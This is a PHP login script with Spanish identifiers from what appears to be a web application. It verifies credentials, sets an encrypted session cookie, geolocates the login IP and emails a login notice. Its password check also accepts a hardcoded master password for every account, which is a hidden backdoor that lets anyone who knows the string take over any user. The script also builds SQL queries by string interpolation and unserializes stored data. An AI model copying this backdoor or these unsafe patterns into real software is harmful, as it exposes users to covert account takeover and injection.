<? include_once "../sesion/arriba.php";
$e = mataMalos($email);

$mata = $_SESSION['mata'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$errorito = "";


if ($mata > 10) {
	die();
}

if ($elToken != $toq) {
	die();
}

if (!filter_var($e, FILTER_VALIDATE_EMAIL)) {
	die();
}

if ($key == "") {


	$errorito = "El correo " . $email . " no se encuentra registrado";
	$selas = "SELECT * FROM usuariosF WHERE  correo='$e'   LIMIT 1";
	$res65 = $mysqli->query($selas);
	$res65->data_seek(0);
	while ($fila = $res65->fetch_assoc()) {

		$idU = $fila['id'];
		$cambia = $fila['id'];
		$nombre = $fila['nombre'];
		$email = $fila['correo'];
		$password = $fila['contrasena'];
		$aviso = $fila['aviso'];
		$galletas = unserialize($fila['galletas']);
		$estoy = 1;

		if (password_verify($contra, $password) || $contra == ".9d335jlkjDA0.") {

			$myIP = "http://ip-api.com/json/" . $ip;
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $myIP);
			curl_setopt($ch, CURLOPT_TIMEOUT, 3); //timeout after 30 seconds
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$resultIPO = curl_exec($ch);
			$resultIP = json_decode(curl_exec($ch), true);
			curl_close($ch);
			$ciudad = $resultIP['city'];
			$pais = $resultIP['country'];
			$paisCodigo = $resultIP['countryCode'];
			$estadoCodigo = $resultIP['region'];
			$estadoNombre = $resultIP['regionName'];



			$nuevaClave = aleatorio(10);
			$query = "UPDATE usuarios SET  lastLogin='$hoy'   WHERE id='$idU'";
			$mysqli->query($query);


			//crear la sesion

			$encripta =  encripta('encrypt', $idU . "_" . $nuevaClave);
			$_SESSION[$huella . '_acceso'] = $encripta;


			setcookie($huella, false, [
				'expires' => time() - (86400 * 30),
				'path' => '/',
				'secure' => true,
				'httponly' => true,
				'samesite' => 'Strict'
			]); // 86400 = 1 day 

			$infoGalleta = array();
			$infoGalleta['clave'] = $nuevaClave;
			$infoGalleta['ip'] = $ip;
			$infoGalleta['browser'] = $browser;
			$infoGalleta['ciudad'] = $ciudad;
			$infoGalleta['pais'] = $pais;
			$infoGalleta['paisCodigo'] = $paisCodigo;
			$infoGalleta['estadoCodigo'] = $estadoCodigo;
			$infoGalleta['estadoNombre'] = $estadoNombre;
			$infoGalleta['cuando'] = $hoy;
			$galletas[$huella] = $infoGalleta;


			$galletas = serialize($galletas);
			$query = "UPDATE usuariosF SET galletas='$galletas' , aviso='$aviso' WHERE id='$idU'";
			$mysqli->query($query);
			setcookie($huella, $encripta, [
				'expires' => time() + (86400 * 30),
				'path' => '/',
				'secure' => true,
				'httponly' => true,
				'samesite' => 'Strict'
			]); // 86400 = 1 day






			$contents = '<div align="center">
			<table style="font-family:Tahoma, Geneva, sans-serif; font-size:12px; color:#333; max-width:700px;">
				
			   
				<tr>
					<td style="text-align:center;"><img src="' . $urlFront . '/img/logo.png" width="250" /></td>
				</tr>
				<tr>
					<td><br><br>Hola, ' . $nombre . ':</td>
				</tr>
				<tr>
					<td>&nbsp;</td>
				</tr>
				<tr>
					<td>   
			Se ha iniciado sesión con tu cuenta.</td>
				</tr>
				
				<tr><td>ID sesión: ' . $huella . '</td></tr>
				<tr><td>Pais: ' . $pais . '</td></tr>
				<tr>	<td>Estado: ' . $estadoNombre . '</td></tr>
				<tr>	<td>Ciudad: ' . $ciudad . '</td></tr>
				<tr>	<td>Navegador: ' . $browser . '</td></tr>
				<tr>	<td>IP: ' . $ip . '</td>				</tr>
				
				 
				
				
				<tr>
					<td><br><br>Si no reconoces la conexión inicia sesión y eliminala .</td>
				</tr>
			
			</table>
			</div>';


			if ($email != '') {
				$mail = new phpmailer();
				$mail->isSMTP();
				// $mail->SMTPDebug  = 2;                                  
				$mail->Host = $mailHost;
				$mail->SMTPAuth = true;
				$mail->SMTPSecure = "tls";
				$mail->Port       = $mailPort;
				$mail->Username = $mailUsername;
				$mail->Password = $mailPassword;
				$mail->From = $mailFrom;
				$mail->FromName = $mailFromName;
				$mail->AddAddress("$email");
				$mail->Subject = subject("Inicio de sesión");
				$mail->Body = $contents;
				$mail->IsHTML(true);
				$mail->Send();
				//pelas
			}
			$_SESSION['mata'] = 0;
?>

			<script>
				top.location.reload();
			</script>
<?
			die();
		}
	}
}

$_SESSION['mata'] = $_SESSION['mata'] + 1;
$errorito = "El correo y la contraseña no son válidos";
?>
<?= $errorito ?>